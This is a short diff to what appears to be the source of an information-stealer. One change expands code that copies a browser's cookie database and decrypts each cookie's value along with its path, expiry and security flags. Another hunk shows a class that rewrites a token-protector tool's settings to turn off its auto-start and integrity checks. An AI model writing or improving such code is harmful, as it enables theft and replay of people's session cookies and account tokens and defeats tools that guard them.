@@ -132,14 +132,14 @@ class Extract:
         shutil.copy(cookiesPath, tempfile)
         db = sqlite3.connect(tempfile)
         cursor = db.cursor()
-        cursor.execute("select host_key, name, encrypted_value from cookies")
+        cursor.execute("select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from cookies")
 
         for row in cursor.fetchall():
-            cookies[row[0]] = {row[1]: self.decryption(row[2], self.key)}
+            cookies[row[0]] = {"name": row[1], "value": self.decryption(row[2], self.key), "path": row[3], "expires": row[4], "secure": row[5], "httponly": row[6]}
 
         cursor.close()
         db.close()
-       
+
         try: os.remove(tempfile)
         except: pass
 
@@ -166,6 +166,7 @@ class Anti_tokenprotector:
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
+                
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
